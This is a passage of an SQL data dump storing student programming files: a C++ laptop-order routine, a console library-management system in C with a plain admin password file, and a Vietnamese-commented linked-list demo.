     << \"\\t\"\r\n         << \" Intel Core i5(10th Gen)\"\r\n         << \"\\t\"\r\n         << \"HP 15s-du1034tu        \"\r\n         << \"947\" << endl;\r\n    cout << str2;\r\n    cout << \"0007\"\r\n         << \"\\t\"\r\n         << \" 4GB\"\r\n         << \"\\t\"\r\n         << \" Intel Core i3(5th Gen) \"\r\n         << \"\\t\"\r\n         << \"Acer Aspire ES1-571    \"\r\n         << \"450\" << endl;\r\n    cout << str2;\r\n    cout << \"0008\"\r\n         << \"\\t\"\r\n         << \" 4GB\"\r\n         << \"\\t\"\r\n         << \" Intel Core i3(7th Gen) \"\r\n         << \"\\t\"\r\n         << \"HP 15-DA0070TX         \"\r\n         << \"864\" << endl;\r\n    cout << str2;\r\n    cout << \"0009\"\r\n         << \"\\t\"\r\n         << \" 4GB\"\r\n         << \"\\t\"\r\n         << \" Intel Core i5(6th Gen) \"\r\n         << \"\\t\"\r\n         << \"Lenovo Ideapad 300     \"\r\n         << \"754\" << endl;\r\n    cout << str2;\r\n    cout << \"0010\"\r\n         << \"\\t\"\r\n         << \" 8GB\"\r\n         << \"\\t\"\r\n         << \" Intel Core i7(5th Gen) \"\r\n         << \"\\t\"\r\n         << \"HP Pavilion 15-ac028TX \"\r\n         << \"1122\" << endl;\r\n    cout << str1;\r\n    cout << \" \" << endl;\r\n\r\n    temp = new node;\r\n\r\n    string str = \"-------------------------------------------\\n\";\r\n\r\n    cout << str;\r\n\r\n    cout << \"Type Order No: \";\r\n    cin >> temp->receipt_number;\r\n\r\n    cout << \"Enter Customer Name: \";\r\n    cin >> temp->customerName;\r\n\r\n    cout << \"Enter Date: \";\r\n    cin >> temp->date;\r\n\r\n    cout << str;\r\n\r\n    cout << \"\\nHow many different laptops would you like to order?\";\r\n    cout << \"\\n(Maximum order is 10 for each transaction): \";\r\n    cin >> temp->x;\r\n\r\n    cout << endl;\r\n\r\n    if (temp->x <= 0)\r\n    {\r\n         cout << \"\\nInvalid order!!!\\n\";\r\n         cout << str;\r\n         system(\"pause\");\r\n    }\r\n\r\n    else if (temp->x > 10)\r\n    {\r\n        cout << \"\\nYour order exceeds the maximum amount of order!!!\\n\";\r\n        cout << str;\r\n        system(\"pause\");\r\n    }\r\n\r\n    else\r\n    {\r\n         cout << str;\r\n\r\n         cout << \"\\t    Enter Computer ID\\n\";\r\n\r\n         for (i = 0; i < temp->x; i++)\r\n         {\r\n              cout << str;\r\n\r\n              cout << \"Please Enter Your Selection: \";\r\n              cin >> temp->menu2[i];\r\n\r\n              cout << \"\\nLaptop Name: \" << temp->computerName[temp->menu2[i] - 1] << endl;\r\n\r\n              cout << \"\\nHow many laptops do you want?: \";\r\n              cin >> temp->quantity[i];\r\n\r\n              temp->amount[i] = temp->quantity[i] * temp->computer[temp->menu2[i] - 1];\r\n              cout << \"\\nThe amount You need to pay is: $. \" << temp->amount[i] << \"/-\" << endl;\r\n\r\n              cout << str << endl;\r\n\r\n              system(\"PAUSE\");\r\n        }\r\n\r\n        cout << \"\\n===========================================================================\" << endl;\r\n        cout << \"                     Order Taken Successfully...\" << endl;\r\n        cout << \"===========================================================================\" << endl;\r\n        cout << \"                Go to Receipt Menu to Pay The Bill\" << endl;\r\n        cout << \"===========================================================================\\n\" << endl;\r\n\r\n        system(\"PAUSE\");\r\n\r\n        temp->next = NULL;\r\n\r\n        if (start_ptr != NULL)\r\n            temp->next = start_ptr;\r\n\r\n        start_ptr = temp;\r\n\r\n        system(\"cls\");\r\n    }\r\n\r\n} // End function take_order\r\n', '2024-07-12 13:23:37', '2024-07-12 13:23:37'),
(25, 15, 'core_functions.h', 'int getdata(int choice){\r\n	int bookID;\r\n	gotoxy(20,3);\r\n    printf(\"Enter the Information Below\");\r\n	gotoxy(20,4);\r\n    printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n	gotoxy(20,5);\r\n	printf(\"\\xB2\");\r\n    gotoxy(46,5);\r\n    printf(\"\\xB2\");\r\n	gotoxy(20,6);\r\n	printf(\"\\xB2\");\r\n    gotoxy(46,6);\r\n    printf(\"\\xB2\");\r\n	gotoxy(20,7);\r\n	printf(\"\\xB2\");\r\n    gotoxy(46,7);\r\n    printf(\"\\xB2\");\r\n	gotoxy(20,8);\r\n	printf(\"\\xB2\");\r\n    gotoxy(46,8);\r\n    printf(\"\\xB2\");\r\n	gotoxy(20,9);\r\n	printf(\"\\xB2\");\r\n    gotoxy(46,9);\r\n    printf(\"\\xB2\");\r\n	gotoxy(20,10);\r\n	printf(\"\\xB2\");\r\n    gotoxy(46,10);\r\n    printf(\"\\xB2\");\r\n	gotoxy(20,11);\r\n	printf(\"\\xB2\");\r\n    gotoxy(46,11);\r\n    printf(\"\\xB2\");\r\n	gotoxy(20,12);\r\n	printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n	gotoxy(21,5);\r\n	printf(\"Category:\");\r\n	gotoxy(31,5);\r\n	printf(\"%s\",catagories[choice-1]);\r\n	gotoxy(21,6);\r\n	printf(\"Book ID:\");\r\n	gotoxy(30,6);\r\n	scanf(\"%d\",&bookID);\r\n	if(checkid(bookID) == 0)\r\n	{\r\n		gotoxy(21,13);\r\n		printf(\"The book id already exists\");\r\n		getch();\r\n		addbooks();\r\n		return 0;\r\n	}\r\n	book.id=bookID;\r\n	gotoxy(21,7);\r\n	printf(\"Book Name:\");\r\n    gotoxy(33,7);\r\n	scanf(\"%s\",book.name);\r\n	gotoxy(21,8);\r\n	printf(\"Author:\");\r\n    gotoxy(30,8);\r\n	scanf(\"%s\",book.Author);\r\n	gotoxy(21,9);\r\n	printf(\"Quantity:\");\r\n    gotoxy(31,9);\r\n	scanf(\"%d\",&book.quantity);\r\n	gotoxy(21,10);\r\n	printf(\"Price:\");\r\n    gotoxy(28,10);\r\n	scanf(\"%f\",&book.Price);\r\n	gotoxy(21,11);\r\n	printf(\"Rack No:\");\r\n    gotoxy(30,11);\r\n	scanf(\"%d\",&book.rackno);\r\n	return 1;\r\n}\r\n\r\nint checkid(int t)  //check whether the book is exist in library or not\r\n{\r\n    FILE *temp;\r\n	temp = fopen(\"Record.dat\",\"rb+\");\r\n	while(fread(&book,sizeof(book),1,temp)==1)\r\n        if(book.id == t){\r\n            fclose(temp);\r\n            return 0;\r\n        }\r\n        fclose(temp);\r\n        return 1;\r\n\r\n}\r\n\r\nvoid searchByID(){\r\n    system(\"cls\");\r\n    int id; FILE *fp;\r\n    gotoxy(25,4);\r\n    printf(\"****Search Books By Id****\");\r\n    gotoxy(20,5);\r\n    printf(\"Enter the book id:\");\r\n    scanf(\"%d\",&id);\r\n    int findBook = 0;\r\n    fp = fopen(\"Record.dat\",\"rb\");\r\n    while(fread(&book,sizeof(book),1,fp)==1){\r\n        if(book.id==id){\r\n            Sleep(2);\r\n            gotoxy(20,7);\r\n            printf(\"The Book is available\");\r\n            gotoxy(20,8);\r\n            printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n            gotoxy(20,9);\r\n            printf(\"\\xB2 ID:%d\",book.id);gotoxy(47,9);printf(\"\\xB2\");\r\n            gotoxy(20,10);\r\n            printf(\"\\xB2 Name:%s\",book.name);gotoxy(47,10);printf(\"\\xB2\");\r\n            gotoxy(20,11);\r\n            printf(\"\\xB2 Author:%s \",book.Author);gotoxy(47,11);printf(\"\\xB2\");\r\n            gotoxy(20,12);\r\n            printf(\"\\xB2 Qantity:%d \",book.quantity);gotoxy(47,12);printf(\"\\xB2\"); gotoxy(47,11);printf(\"\\xB2\");\r\n            gotoxy(20,13);\r\n            printf(\"\\xB2 Price:Rs.%.2f\",book.Price);gotoxy(47,13);printf(\"\\xB2\");\r\n            gotoxy(20,14);\r\n            printf(\"\\xB2 Rack No:%d \",book.rackno);gotoxy(47,14);printf(\"\\xB2\");\r\n            gotoxy(20,15);\r\n            printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n            findBook = 1;\r\n        }\r\n    }\r\n    if(findBook == 0){  //checks whether conditiion enters inside loop or not\r\n        gotoxy(20,8);\r\n        printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n        gotoxy(20,9);printf(\"\\xB2\");  gotoxy(38,9);printf(\"\\xB2\");\r\n        gotoxy(20,10);\r\n        printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n        gotoxy(22,9);printf(\"\\aNo Record Found\");\r\n    }\r\n    fclose(fp);\r\n    gotoxy(20,17);\r\n    printf(\"Try another search?(Y/N)\");\r\n    if(getch()==\'y\')\r\n        searchByID();\r\n    else\r\n        mainmenu();\r\n}\r\n\r\nvoid searchByName(){\r\n    system(\"cls\");\r\n    char s[15];\r\n    int d=0;\r\n    FILE *fp;\r\n    gotoxy(25,4);\r\n    printf(\"****Search Books By Name****\");\r\n    gotoxy(20,5);\r\n    printf(\"Enter Book Name:\");\r\n    scanf(\"%s\",s);\r\n    fp = fopen(\"Record.dat\",\"rb\");\r\n    while(fread(&book,sizeof(book),1,fp)==1){\r\n        if(strcmp(book.name,(s))==0){ //checks whether book.name is equal to s or not\r\n            gotoxy(20,7);\r\n            printf(\"The Book is available\");\r\n            gotoxy(20,8);\r\n            printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n            gotoxy(20,9);\r\n            printf(\"\\xB2 ID:%d\",book.id);gotoxy(47,9);printf(\"\\xB2\");\r\n            gotoxy(20,10);\r\n            printf(\"\\xB2 Name:%s\",book.name);gotoxy(47,10);printf(\"\\xB2\");\r\n            gotoxy(20,11);\r\n            printf(\"\\xB2 Author:%s\",book.Author);gotoxy(47,11);printf(\"\\xB2\");\r\n            gotoxy(20,12);\r\n            printf(\"\\xB2 Qantity:%d\",book.quantity);gotoxy(47,12);printf(\"\\xB2\");\r\n            gotoxy(20,13);\r\n            printf(\"\\xB2 Price:Rs.%.2f\",book.Price);gotoxy(47,13);printf(\"\\xB2\");\r\n            gotoxy(20,14);\r\n            printf(\"\\xB2 Rack No:%d \",book.rackno);gotoxy(47,14);printf(\"\\xB2\");\r\n            gotoxy(20,15);\r\n            printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n            d++;\r\n        }\r\n    }\r\n    if(d==0){\r\n        gotoxy(20,8);\r\n        printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n        gotoxy(20,9);printf(\"\\xB2\");  gotoxy(38,9);printf(\"\\xB2\");\r\n        gotoxy(20,10);\r\n        printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n        gotoxy(22,9);printf(\"\\aNo Record Found\");\r\n    }\r\n    fclose(fp);\r\n    gotoxy(20,17);\r\n    printf(\"Try another search?(Y/N)\");\r\n    if(getch()==\'y\')\r\n        searchByName();\r\n    else\r\n        mainmenu();\r\n}\r\n\r\n', '2024-07-12 15:15:21', '2024-07-12 15:15:21'),
(26, 15, 'general_functions.h', '#include \"variables.h\"\r\n\r\nvoid gotoxy (int x, int y)\r\n{\r\n        coord.X = x; coord.Y = y; // X and Y coordinates\r\n        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);\r\n}\r\n\r\nvoid returnfunc()\r\n{\r\n	printf(\" \\nPress ENTER to return to main menu\");\r\n    a:\r\n        if(getch()==13) //allow only use of enter\r\n            mainmenu();\r\n        else\r\n        goto a;\r\n}\r\n\r\nvoid get_password(char* pass)\r\n{\r\n    char temp_passP[25];\r\n    int i=0;\r\n     while(1)\r\n    {\r\n            temp_passP[i]=getch();\r\n            if(temp_passP[i]==13){break;}\r\n            else if(temp_passP[i]==8)\r\n            {\r\n                if(i!=0) {\r\n                printf(\"\\b \\b\");\r\n                i--;\r\n                } else {printf(\"\\a\");}\r\n            }\r\n            else\r\n            {\r\n                printf(\"*\");\r\n                *(pass+i) = temp_passP[i];\r\n                i++;\r\n            }\r\n             *(pass+i)=\'\\0\';\r\n     }\r\n}\r\n\r\n\r\n\r\nvoid creditNclose(){\r\n    system(\"cls\");\r\n    gotoxy(16,3);\r\n    printf(\"THANK YOU USING OUR SYSTEM\");\r\n    printf(\"Exiting in 3 second...........>\");\r\n    Sleep(3000);\r\n    exit(0);\r\n}\r\n\r\nint t(void) //for time\r\n{\r\n    time_t t;\r\n    time(&t);\r\n    printf(\"Date and time:%s\\n\",ctime(&t));\r\n}\r\n\r\nvoid adminsignup(){\r\n    char temp[10];\r\n    login = fopen(\"password.dat\",\"wb\");\r\n    gotoxy(10,10);\r\n    printf(\"Enter password: \");\r\n    get_password(password);\r\n    gotoxy(10,11);\r\n    printf(\"Re Enter Password: \");\r\n    get_password(temp);\r\n    while(strcmp(password,temp)!=0){\r\n        gotoxy(10,10);\r\n        printf(\"Password did not matched! Enter again\");\r\n        gotoxy(10,11);\r\n        printf(\"Enter password: \");\r\n        get_password(password);\r\n        gotoxy(10,12);\r\n        printf(\"Re Enter Password: \");\r\n        get_password(temp);\r\n        system(\"cls\");\r\n    }\r\n    fwrite(&password,sizeof(password),1,login);\r\n    fclose(login);\r\n}\r\n\r\nvoid adminsignin(){\r\n    char temp[10];\r\n    login = fopen(\"password.dat\",\"rb\");\r\n    gotoxy(10,10);\r\n    printf(\"Enter password: \");\r\n    get_password(temp);\r\n    while(fread(&password, sizeof(password),1,login)==1){\r\n        while(strcmp(temp,password)!=0){\r\n            system(\"cls\");\r\n            gotoxy(10,10);\r\n            printf(\"Password did not match! \");\r\n            printf(\"Enter Again: \");\r\n            get_password(temp);\r\n        }\r\n        gotoxy(10,11);\r\n        printf(\"Password Match\");\r\n        break;\r\n    }\r\n    fclose(login);\r\n    gotoxy(10,12);\r\n    printf(\"Press any key...\");\r\n    getch();\r\n}\r\n\r\nvoid add_window(){\r\n    gotoxy(15,0);\r\n    printf(\"================ Library System ================\\n\");\r\n    gotoxy(20,5);\r\n	printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2SELECT CATEGOIES\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n	gotoxy(20,7);\r\n	printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 1. Computer\");\r\n	gotoxy(20,9);\r\n	printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 2. Electronics\");\r\n	gotoxy(20,11);\r\n	printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 3. Electrical\");\r\n	gotoxy(20,13);\r\n	printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 4. Civil\");\r\n	gotoxy(20,15);\r\n	printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 5. Mechanical\");\r\n	gotoxy(20,17);\r\n	printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 6. Architecture\");\r\n	gotoxy(20,19);\r\n	printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 7. Back to main menu\");\r\n	gotoxy(20,21);\r\n	printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n\r\n}\r\n\r\nint change_password(){\r\n    system(\"cls\");\r\n    FILE *login;\r\n    char old_pass[10], new_pass[10];\r\n    gotoxy(10,10);\r\n    printf(\"Enter Old password: \");\r\n    get_password(old_pass);\r\n    gotoxy(10,11);\r\n    printf(\"Enter New password: \");\r\n    get_password(new_pass);\r\n    login = fopen(\"password.dat\",\"rb+\");\r\n    while(fread(&password,sizeof(password),1,login)==1){\r\n        if(strcmp(old_pass,password)==0){\r\n            strcpy(password,new_pass);\r\n            fseek(login,-sizeof(password),SEEK_CUR);\r\n            fwrite(&password,sizeof(password),1,login);\r\n            fclose(login);\r\n            gotoxy(10,12);\r\n            printf(\"Password sucessfully changed! \");\r\n            return 1;\r\n        }else{\r\n            gotoxy(10,12);\r\n            printf(\"Password changing process failed!\");\r\n            return 0;\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '2024-07-12 16:48:52', '2024-07-12 16:48:52'),
(27, 15, 'terminal library system.c', '\r\n#include \"general_functions.h\"\r\n#include \"core_functions.h\"\r\n\r\n\r\nint main(){\r\n    login = fopen(\"password.dat\",\"rb\");\r\n    if(login == NULL){\r\n        gotoxy(10,9);\r\n        printf(\"Database Do not exits. Be an adminstrator. Sign Up\");\r\n        adminsignup();\r\n    }else{\r\n        adminsignin();\r\n    }\r\n    mainmenu();\r\n    return 0;\r\n}\r\n\r\nvoid mainmenu()\r\n{\r\n    while(1){\r\n        system(\"cls\");\r\n        gotoxy(15,0);\r\n        printf(\"================ Library System ================\\n\");\r\n        gotoxy(20,3);\r\n        printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2 MAIN MENU \\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n        gotoxy(20,5);\r\n        printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 1. Add Books   \");\r\n        gotoxy(20,7);\r\n        printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 2. Delete Book\");\r\n        gotoxy(20,9);\r\n        printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 3. Search Book\");\r\n        gotoxy(20,11);\r\n        printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 4. View Book List\");\r\n        gotoxy(20,13);\r\n        printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 5. Edit Book Record \");\r\n        gotoxy(20,15);\r\n        printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 6. Change Password\");\r\n        gotoxy(20,17);\r\n        printf(\"\\xDB\\xDB\\xDB\\xDB\\xB2 7. Close Application\");\r\n        gotoxy(20,19);\r\n        printf(\"\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\\xB2\");\r\n        gotoxy(20,21);\r\n        printf(\"Enter your choice:\");\r\n        switch(getch()){\r\n            case \'1\':\r\n                addbooks();\r\n                break;\r\n            case \'2\':\r\n                deletebooks();\r\n                break;\r\n            case \'3\':\r\n                searchbooks();\r\n                break;\r\n            case \'4\':\r\n                viewbooks();\r\n                break;\r\n            case \'5\':\r\n                editbooks();\r\n                break;\r\n            case \'6\':\r\n                change_password();\r\n                gotoxy(10,13);\r\n                printf(\"press any key to continue....\");\r\n                getch();\r\n                break;\r\n            case \'7\':\r\n                creditNclose();\r\n            default:\r\n                gotoxy(10,23);\r\n                printf(\"\\aWrong Entry!!Please re-entered correct option\");\r\n                getch(); //holds the screen until a key is pressed\r\n        }\r\n    }\r\n}\r\nvoid addbooks(void){    //funtion that add books\r\n	system(\"cls\");\r\n	FILE *fp;\r\n	int i, choice;\r\n	add_window();\r\n	gotoxy(20,22);\r\n	printf(\"Enter your choice:\");\r\n	scanf(\"%d\", &choice);\r\n	if(choice==7)\r\n        mainmenu() ;\r\n	system(\"cls\");\r\n	fp = fopen(\"Record.dat\",\"ab+\");\r\n	if(getdata(choice) == 1){\r\n        book.cat=catagories[choice-1];\r\n        fseek(fp,0,SEEK_END);\r\n        fwrite(&book,sizeof(book),1,fp);\r\n        fclose(fp);\r\n        gotoxy(21,14);\r\n        printf(\"The record is sucessfully saved\");\r\n        gotoxy(21,15);\r\n        printf(\"Save any more?(Y / N):\");\r\n        if(getch()==\'n\')\r\n            mainmenu();\r\n        else{\r\n            system(\"cls\");\r\n            addbooks();\r\n        }\r\n    }\r\n    fclose(fp);\r\n}\r\nvoid deletebooks(){    //function that delete items from file Record.dat\r\n    FILE *ft,*fp;\r\n    system(\"cls\");\r\n    int d,findBook = 0;\r\n    char another=\'y\';\r\n    while(another==\'y\'){  //infinite loop\r\n        system(\"cls\");\r\n        gotoxy(10,5);\r\n        printf(\"Enter the Book ID to  delete:\");\r\n        scanf(\"%d\",&d);\r\n        fp = fopen(\"Record.dat\",\"rb+\");\r\n        while(fread(&book,sizeof(book),1,fp)==1){\r\n            if(book.id==d){\r\n                gotoxy(10,7);\r\n                printf(\"The book record is available\");\r\n                gotoxy(10,8);\r\n                printf(\"Book name is %s\",book.name);\r\n                gotoxy(10,9);\r\n                printf(\"Rack No. is %d\",book.rackno);\r\n                findBook = 1;\r\n                gotoxy(10,10);\r\n                printf(\"Do you want to delete it?(Y/N):\");\r\n                if(getch()==\'y\'){\r\n                    ft=fopen(\"test.dat\",\"wb\");  //temporary file for delete\r\n                    rewind(fp);\r\n                    while(fread(&book,sizeof(book),1,fp)==1){\r\n                        if(book.id!=d){\r\n                            fwrite(&book,sizeof(book),1,ft); //write all in tempory file except that\r\n                        }                              //we want to delete\r\n                    }\r\n                    fclose(fp);\r\n                    fclose(ft);\r\n                    remove(\"Record.dat\");\r\n                    rename(\"test.dat\",\"Record.dat\"); //copy all item from temporary file to fp except that\r\n                                        //we want to delete\r\n                    gotoxy(10,11);\r\n                    printf(\"The record is sucessfully deleted\");\r\n                }\r\n            }\r\n        }\r\n        if(findBook == 0){\r\n            gotoxy(10,10);\r\n            printf(\"No record is found\");\r\n            getch();\r\n        }\r\n        gotoxy(10,12);\r\n        printf(\"Delete another record?(Y/N)\");\r\n        fflush(stdin);\r\n        another=getch();\r\n    }\r\n}\r\n\r\n\r\nvoid searchbooks()\r\n{\r\n    system(\"cls\");\r\n    gotoxy(15,0);\r\n    printf(\"================ Library System ================\\n\");\r\n    gotoxy(15,6);\r\n    printf(\"################ Search Books ##################\");\r\n    gotoxy(20,10);\r\n    printf(\"\\xDB\\xDB\\xDB\\xB2 1. Search By ID\");\r\n    gotoxy(20,14);\r\n    printf(\"\\xDB\\xDB\\xDB\\xB2 2. Search By Name\");\r\n    gotoxy( 15,20);\r\n    printf(\"Enter Your Choice\");\r\n    switch(getch())\r\n    {\r\n        case \'1\':\r\n            searchByID();\r\n            break;\r\n        break;\r\n        case \'2\':\r\n            searchByName();\r\n            break;\r\n        default :\r\n            getch();\r\n            searchbooks();\r\n    }\r\n}\r\n\r\nvoid viewbooks(void)\r\n{\r\n    int j;\r\n    FILE *fp;\r\n    system(\"cls\");\r\n    gotoxy(6,1);\r\n    printf(\"========================= Book List =========================\");\r\n    gotoxy(2,3);\r\n    printf(\" CATEGORY     ID    BOOK NAME     AUTHOR       QTY     PRICE     RackNo \");\r\n    j=4;\r\n    fp=fopen(\"Record.dat\",\"rb\");\r\n    while(fread(&book,sizeof(book),1,fp)==1){\r\n        gotoxy(3,j);\r\n        printf(\"%s\",book.cat);\r\n        gotoxy(16,j);\r\n        printf(\"%d\",book.id);\r\n        gotoxy(22,j);\r\n        printf(\"%s\",book.name);\r\n        gotoxy(36,j);\r\n        printf(\"%s\",book.Author);\r\n        gotoxy(50,j);\r\n        printf(\"%d\",book.quantity);\r\n        gotoxy(57,j);\r\n        printf(\"%.2f\",book.Price);\r\n        gotoxy(69,j);\r\n        printf(\"%d\",book.rackno);\r\n        printf(\"\\n\\n\");\r\n        j++;\r\n    }\r\n    fclose(fp);\r\n    gotoxy(35,25);\r\n    returnfunc();\r\n}\r\n\r\n\r\nvoid editbooks(void)  //edit information about book\r\n{\r\n	system(\"cls\");\r\n	FILE *fp;\r\n	int c=0,d;\r\n	gotoxy(20,4);\r\n	printf(\"****Edit Books Section****\");\r\n	char another=\'y\';\r\n	while(another==\'y\')\r\n	{\r\n		system(\"cls\");\r\n		gotoxy(15,6);\r\n		printf(\"Enter Book Id to be edited:\");\r\n		scanf(\"%d\",&d);\r\n		fp=fopen(\"Record.dat\",\"rb+\");\r\n		while(fread(&book,sizeof(book),1,fp)==1)\r\n		{\r\n			if(checkid(d)==0)\r\n			{\r\n				gotoxy(15,7);\r\n				printf(\"The book is availble\");\r\n				gotoxy(15,8);\r\n				printf(\"The Book ID:%d\",book.id);\r\n				gotoxy(15,9);\r\n				printf(\"Enter new name:\");scanf(\"%s\",book.name);\r\n				gotoxy(15,10);\r\n				printf(\"Enter new Author:\");scanf(\"%s\",book.Author);\r\n				gotoxy(15,11);\r\n				printf(\"Enter new quantity:\");scanf(\"%d\",&book.quantity);\r\n				gotoxy(15,12);\r\n				printf(\"Enter new price:\");scanf(\"%f\",&book.Price);\r\n				gotoxy(15,13);\r\n				printf(\"Enter new rackno:\");scanf(\"%d\",&book.rackno);\r\n				gotoxy(15,14);\r\n				printf(\"The record is modified\");\r\n				fseek(fp,ftell(fp)-sizeof(book),0);\r\n				fwrite(&book,sizeof(book),1,fp);\r\n				fclose(fp);\r\n				c=1;\r\n			}\r\n			if(c==0)\r\n			{\r\n				gotoxy(15,9);\r\n				printf(\"No record found\");\r\n			}\r\n		}\r\n		gotoxy(15,16);\r\n		printf(\"Modify another Record?(Y/N)\");\r\n		fflush(stdin);\r\n		another=getch() ;\r\n	}\r\n		returnfunc();\r\n}\r\n\r\n\r\n\r\n', '2024-07-12 16:49:43', '2024-07-12 16:49:43'),
(28, 15, 'variables.h', '#include<stdio.h>\r\n#include<conio.h>\r\n#include <stdlib.h>\r\n#include<string.h>\r\n#include<time.h>\r\n#include<windows.h>\r\n\r\nFILE *login;\r\n//list of global variable\r\nchar findBook;\r\nchar password[10];\r\n\r\nstruct BOOK\r\n{\r\n    int id;\r\n    char name[20];\r\n    char Author[20];\r\n    int quantity;\r\n    float Price;\r\n    int rackno;\r\n    char *cat;\r\n};\r\nstruct BOOK book;\r\n\r\nCOORD coord = {0, 0};\r\n\r\n//list of function prototype\r\nchar catagories[][15]={\"Computer\",\"Electronics\",\"Electrical\",\"Civil\",\"Mechnnical\",\"Architecture\"};\r\nvoid returnfunc(void);\r\nvoid mainmenu(void);\r\nvoid addbooks(void);\r\nvoid deletebooks(void);\r\nvoid editbooks(void);\r\nvoid searchbooks(void);\r\nvoid issuebooks(void);\r\nvoid viewbooks(void);\r\nvoid closeapplication(void);\r\nint  getdata(int);\r\nint  checkid(int);\r\nvoid Password();\r\nvoid get_password(char *);\r\nvoid issuerecord();\r\nvoid creditNclose();\r\nvoid adminsignup();\r\n\r\n', '2024-07-12 16:50:18', '2024-07-12 16:50:18'),
(29, 16, 'LinkedList.cpp', '//Traversing linked list: duyệt qua và in ra giá trị cụ thể của từng Node\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\n//khai báo cấu trúc của node trong linked list\r\nstruct Node{\r\n	int data;\r\n	Node* next;\r\n};\r\n\r\n//hàm duyệt qua và in giá trị của từng node trong linked list\r\nvoid printLinkedList(Node* head){\r\n	//đặt node current là node đầu tiên của linked list\r\n	Node* current = head;\r\n	while(current != nullptr){\r\n		cout << current->data << \" \";//in ra giá trị của node hiện tại\r\n		current = current->next; // chuyển sang node kế tiếp\r\n	}\r\n}\r\n\r\nint main() {\r\n	//tạo các node trong linked list\r\n	Node* head = new Node();//first node\r\n	Node* second = new Node(); // second node\r\n	Node* third = new Node(); // third Node\r\n	\r\n	//gán giá trị vào từng node\r\n	head->data = 1;\r\n	head->next = second;\r\n	second->data = 2;\r\n	second->next = third;\r\n	third->data = 3;\r\n	third->next = nullptr; // không có node kế tiếp\r\n	//duyệt qua và in giá trị của từng node trong linked list\r\n	printLinkedList(head);\r\n	//giải phóng bộ nhớ\r\n	delete head;\r\n	delete second;\r\n	delete third;\r\n	\r\n	return 0;\r\n}', '2024-07-18 03:43:43', '2024-07-18 03:43:43'),
